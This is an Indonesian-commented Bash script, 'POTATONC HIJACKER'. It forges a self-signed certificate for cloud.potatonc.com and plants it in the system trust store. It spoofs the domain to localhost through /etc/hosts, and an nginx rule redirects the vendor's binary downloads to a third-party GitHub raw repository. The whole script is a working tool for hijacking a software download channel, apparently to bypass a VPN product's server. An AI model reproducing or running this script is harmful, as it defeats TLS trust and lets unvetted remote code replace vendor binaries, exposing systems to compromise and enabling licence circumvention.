#!/bin/bash

# ==========================================
# POTATONC HIJACKER - FINAL FIX
# Fitur: Auto SSL, DNS Spoofing, & Dynamic URL Redirect
# Tested on: Debian 10+, Ubuntu 20+
# ==========================================

# KONFIGURASI UTAMA
DOMAIN="cloud.potatonc.com"
# URL GitHub RAW (Tanpa slash di belakang)
GITHUB_REPO="https://raw.githubusercontent.com/ica4me/vpn-script-tunneling/main"
CERT_DIR="/etc/nginx/ssl/hijack"
MY_IP="127.0.0.1"

# Warna Output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

clear
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}   SYSTEM HIJACKER & REDIRECTOR (FINAL)      ${NC}"
echo -e "${GREEN}=============================================${NC}"

# 1. Cek Root
if [ "$(id -u)" != "0" ]; then
   echo -e "${RED}[!] Harap jalankan script ini sebagai root!${NC}"
   exit 1
fi

# 2. Bersihkan Konfigurasi Lama (Agar tidak bentrok)
echo -e "${YELLOW}[*] Membersihkan konfigurasi lama...${NC}"
sed -i "/$DOMAIN/d" /etc/hosts
rm -f /etc/nginx/conf.d/hijack_$DOMAIN.conf
rm -rf $CERT_DIR

# 3. Install Dependencies
echo -e "${YELLOW}[*] Menginstall Nginx & OpenSSL...${NC}"
apt-get update -y
apt-get install nginx openssl ca-certificates curl -y

# 4. Buat Sertifikat SSL Self-Signed
echo -e "${YELLOW}[*] Membuat Sertifikat SSL Palsu...${NC}"
mkdir -p $CERT_DIR

# Buat Config OpenSSL
cat > $CERT_DIR/openssl.cnf <<EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no
[req_distinguished_name]
C = ID
ST = Jakarta
L = Jakarta
O = Hijacked System
CN = $DOMAIN
[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = $DOMAIN
EOF

# Generate Key & CRT
openssl genrsa -out $CERT_DIR/hijack.key 2048
openssl req -new -key $CERT_DIR/hijack.key -out $CERT_DIR/hijack.csr -config $CERT_DIR/openssl.cnf
openssl x509 -req -days 3650 -in $CERT_DIR/hijack.csr -signkey $CERT_DIR/hijack.key -out $CERT_DIR/hijack.crt -extensions v3_req -extfile $CERT_DIR/openssl.cnf

# 5. Percayakan Sertifikat ke Sistem (Trust Store)
echo -e "${YELLOW}[*] Menanamkan sertifikat ke sistem...${NC}"
cp $CERT_DIR/hijack.crt /usr/local/share/ca-certificates/${DOMAIN}.crt
update-ca-certificates --fresh

# 6. Konfigurasi Nginx (FIXED LOGIC)
echo -e "${YELLOW}[*] Membuat Konfigurasi Nginx dengan Regex...${NC}"

cat > /etc/nginx/conf.d/hijack_$DOMAIN.conf <<EOF
server {
    listen 443 ssl;
    server_name $DOMAIN;

    ssl_certificate $CERT_DIR/hijack.crt;
    ssl_certificate_key $CERT_DIR/hijack.key;

    # LOGIKA UTAMA:
    # Menangkap apapun setelah /v2/download/ dan menyimpannya sebagai variabel \$1
    # Contoh: /v2/download/fixdep -> \$1 = fixdep
    location ~ ^/v2/download/(.*)$ {
        # Redirect ke GitHub Raw + Nama File
        return 302 $GITHUB_REPO/\$1;
    }

    # Fallback jika path tidak sesuai
    location / {
        return 404;
    }
}
EOF

# Restart Nginx
systemctl enable nginx
systemctl restart nginx

# 7. Manipulasi Hosts (DNS Spoofing)
echo -e "${YELLOW}[*] Mengalihkan DNS Lokal...${NC}"
echo "$MY_IP $DOMAIN" >> /etc/hosts

# 8. Verifikasi Otomatis
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}   VERIFIKASI HASIL PATCHING                 ${NC}"
echo -e "${GREEN}=============================================${NC}"

# Test Ping
PING_CHECK=$(ping -c 1 $DOMAIN | grep "127.0.0.1")
if [[ ! -z "$PING_CHECK" ]]; then
    echo -e "DNS Check     : ${GREEN}[OK] Mengarah ke Localhost${NC}"
else
    echo -e "DNS Check     : ${RED}[FAIL] Masih mengarah ke IP Asli${NC}"
fi

# Test Redirect Header (Simulasi request binary)
# Kita test request file dummy 'fixdep'
HTTP_CODE=$(curl -o /dev/null -s -w "%{http_code}\n" "https://$DOMAIN/v2/download/fixdep")

if [[ "$HTTP_CODE" == "302" ]]; then
    echo -e "Nginx Rule    : ${GREEN}[OK] Redirect aktif (302 Found)${NC}"
    
    # Cek lokasi tujuan redirect
    REDIRECT_URL=$(curl -Is "https://$DOMAIN/v2/download/fixdep" | grep -i "Location" | awk '{print $2}' | tr -d '\r')
    echo -e "Target URL    : ${YELLOW}$REDIRECT_URL${NC}"
    
    # Validasi apakah URL target sesuai format GitHub + File
    if [[ "$REDIRECT_URL" == *"$GITHUB_REPO/fixdep"* ]]; then
        echo -e "Logic Validasi: ${GREEN}[PERFECT] URL sesuai format file!${NC}"
    else
        echo -e "Logic Validasi: ${RED}[WARNING] URL target tampak aneh.${NC}"
    fi

else
    echo -e "Nginx Rule    : ${RED}[FAIL] Response Code: $HTTP_CODE${NC}"
    echo -e "Pastikan Nginx berjalan dan port 443 tidak bentrok."
fi

echo -e "${GREEN}=============================================${NC}"
echo -e "Selesai. Sekarang binary akan otomatis mengambil file"
echo -e "dari repo GitHub Anda setiap kali request ke PotatoNC."